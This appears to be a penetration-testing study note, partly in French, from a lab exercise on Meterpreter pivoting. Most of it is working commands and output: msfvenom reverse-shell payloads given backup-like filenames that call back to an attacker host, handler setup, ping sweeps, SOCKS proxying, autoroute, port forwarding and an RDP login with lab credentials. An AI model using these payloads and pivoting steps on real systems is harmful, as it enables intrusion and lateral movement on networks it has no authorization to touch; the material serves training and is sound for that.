# Meterpreter Tunneling & Port Forwarding

## <mark style="color:red;">Meterpreter Tunneling</mark>

#### <mark style="color:green;">Création de la charge utile pour l'hôte pivot Ubuntu</mark>

{% code overflow="wrap" fullWidth="true" %}
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
{% endcode %}

#### <mark style="color:green;">Configuration et démarrage du multi/handler</mark>

```
msf6 > use exploit/multi/handler

[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Démarrage du gestionnaire TCP inverse sur 0.0.0.0:8080
```

#### <mark style="color:green;">Exécution de la charge utile sur l'hôte pivot</mark>

```
ubuntu@WebServer:~$ ls
backupjob
ubuntu@WebServer:~$ chmod +x backupjob
ubuntu@WebServer:~$ ./backupjob
```

#### <mark style="color:green;">Établissement de la session Meterpreter</mark>

{% code fullWidth="true" %}
```
[*] Envoi de l'étape (3020772 octets) à 10.129.202.64
[*] Session Meterpreter 1 ouverte (10.10.14.18:8080 -> 10.129.202.64:39826) à 2022-03-03 12:27:43 -0500
meterpreter > pwd
/home/ubuntu
```
{% endcode %}

{% hint style="warning" %}
Nous savons que la cible Windows est sur le réseau 172.16.5.0/23. En supposant que le pare-feu de la cible Windows autorise les requêtes ICMP, nous voudrions effectuer un balayage ping sur ce réseau. Nous pouvons le faire en utilisant Meterpreter avec le module ping\_sweep, qui générera le trafic ICMP depuis l'hôte Ubuntu vers le réseau 172.16.5.0/23.
{% endhint %}

#### <mark style="color:green;">Balayage Ping</mark>

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### <mark style="color:green;">Boucle For pour un balayage Ping sur des hôtes Linux</mark>

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### <mark style="color:green;">Boucle For pour un balayage Ping en utilisant CMD</mark>

```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### <mark style="color:green;">Balayage Ping en utilisant PowerShell</mark>

{% code fullWidth="true" %}
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
{% endcode %}

#### <mark style="color:green;">Configuration du proxy SOCKS de MSF</mark>

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
```

<mark style="color:green;">**Confirming Proxy Server is Running**</mark>

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

<mark style="color:green;">**Adding a Line to proxychains.conf if Needed**</mark>

```shell-session
socks4 	127.0.0.1 9050
```

{% hint style="warning" %}
Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
{% endhint %}

<mark style="color:green;">**Creating Routes with AutoRoute**</mark>

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

```

<mark style="color:green;">**Listing Active Routes with AutoRoute**</mark>

```shell-session
meterpreter > run autoroute -p
```

<mark style="color:green;">**Testing Proxy & Routing Functionality**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

***

## <mark style="color:red;">Port Forwarding</mark>

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

<mark style="color:green;">**Portfwd options**</mark>

{% code fullWidth="true" %}
```shell-session
meterpreter > help portfwd
```
{% endcode %}

<mark style="color:green;">**Creating Local TCP Relay**</mark>

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

<mark style="color:green;">**Connecting to Windows Target through localhost**</mark>

```shell-session
mrroboteLiot@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

<mark style="color:green;">**Netstat Output**</mark>

We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.

{% code fullWidth="true" %}
```shell-session
mrroboteLiot@htb[/htb]$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```
{% endcode %}

***

## <mark style="color:red;">Meterpreter Reverse Port Forwarding</mark>

{% hint style="info" %}
Comme pour le **port forwarding local**, Metasploit peut aussi effectuer un **reverse port forwarding**. Ici, on écoute sur un port spécifique du serveur compromis et on redirige toutes les connexions entrantes du serveur Ubuntu vers notre hôte d’attaque. Par exemple, on peut transférer le port 1234 du serveur Ubuntu vers notre port local 8081 et configurer un listener sur ce port pour recevoir une session Windows.
{% endhint %}

<mark style="color:green;">**Reverse Port Forwarding Rules**</mark>

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

<mark style="color:green;">**Configuring & Starting multi/handler**</mark>

```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

<mark style="color:green;">**Generating the Windows Payload**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```
{% endcode %}

<mark style="color:green;">**Establishing the Meterpreter session**</mark>

```shell-session
meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```
